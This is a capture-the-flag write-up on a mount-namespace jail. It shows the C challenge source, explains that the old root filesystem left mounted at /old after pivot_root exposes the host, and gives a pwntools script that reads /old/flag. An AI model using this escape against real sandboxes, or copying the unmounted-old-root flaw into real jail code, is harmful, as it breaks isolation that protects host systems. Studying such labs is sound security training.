#metadata(
  (
    title: "Mount Namespace and pivot_root Escape",
    description: "Escaping a mount namespace sandbox by accessing the old root filesystem which was not unmounted after pivot_root.",
    date: "2025-12-30",
    order: 14,
    draft: false,
  ),
)<frontmatter>
#import "../../../../typst-theme.c.typ": project
#show: project

= Mount Namespace and pivot_root Escape

== Challenge Source Code

```c
#define _GNU_SOURCE 1

#include <stdlib.h>
#include <stdint.h>
#include <stdbool.h>
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <time.h>
#include <errno.h>
#include <assert.h>
#include <libgen.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <sys/signal.h>
#include <sys/mman.h>
#include <sys/ioctl.h>
#include <sys/sendfile.h>
#include <sys/prctl.h>
#include <sys/personality.h>
#include <arpa/inet.h>

#include <sys/syscall.h>
#include <sys/mount.h>
#include <dirent.h>
#include <limits.h>
#include <sched.h>

char hostname[128];

int main(int argc, char **argv, char **envp)
{
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    for (int i = 3; i < 10000; i++) close(i);

    char new_root[] = "/tmp/jail-XXXXXX";
    char old_root[PATH_MAX];

    assert(geteuid() == 0);

    assert(unshare(CLONE_NEWNS) != -1);

    // create the new root
    assert(mkdtemp(new_root) != NULL);

    // change the old root (/) to a private mount so that pivot_root succeeds
    assert(mount(NULL, "/", NULL, MS_REC | MS_PRIVATE, NULL) != -1);

    // bind-mount the new root over itself
    assert(mount(new_root, new_root, NULL, MS_BIND, NULL) != -1);

    // create a directory in which pivot_root will put the old root filesystem
    snprintf(old_root, sizeof(old_root), "%s/old", new_root);
    assert(mkdir(old_root, 0777) != -1);

    // pivot the root filesystem
    assert(syscall(SYS_pivot_root, new_root, old_root) != -1);

    assert(mkdir("/bin", 0755) != -1);
    assert(mount("/old/bin", "/bin", NULL, MS_BIND, NULL) != -1);

    assert(mkdir("/usr", 0755) != -1);
    assert(mount("/old/usr", "/usr", NULL, MS_BIND, NULL) != -1);

    assert(mkdir("/lib", 0755) != -1);
    assert(mount("/old/lib", "/lib", NULL, MS_BIND, NULL) != -1);

    assert(mkdir("/lib64", 0755) != -1);
    assert(mount("/old/lib64", "/lib64", NULL, MS_BIND, NULL) != -1);

    // make things simpler for everyone to avoid strange behavior with permissions
    setresuid(0, 0, 0);

    assert(chdir("/") == 0);

    int fffd = open("/flag", O_WRONLY | O_CREAT);
    write(fffd, "try harder", 10);
    close(fffd);

    assert(execl("/bin/bash", "/bin/bash", "-p", NULL) != -1);
}

```

== Vulnerability Analysis

The challenge uses `pivot_root` to change the system root to a new directory. `pivot_root` takes two arguments: `new_root` and `put_old`. It moves the current root mount to `put_old` and makes `new_root` the new root mount.

```c
// create a directory in which pivot_root will put the old root filesystem
snprintf(old_root, sizeof(old_root), "%s/old", new_root);
// ...
assert(syscall(SYS_pivot_root, new_root, old_root) != -1);
```

The vulnerability is that the program **fails to unmount the old root** from `/old` after the pivot. While it sets up a jail, it explicitly preserves access to the entire host filesystem at `/old` inside that jail.

== Exploitation Plan

1.  **Identify Old Root:** The challenge source code (or exploration) reveals that the old root filesystem is mounted at `/old`.
2.  **Access Flag:** Since `/old` corresponds to the host's `/`, the real flag (at `/flag` on the host) is accessible at `/old/flag`.
3.  **Read Flag:** Use the provided shell to read the file.

== Exploit Script

```python
from pwn import *

exe = "./challenge"
context.binary = exe

# The challenge gives us a shell. We just need to interact with it.
p = process(exe)

# Wait for the shell prompt (or just send commands)
p.sendline(b"cat /old/flag")

print(p.recvall().decode())
```
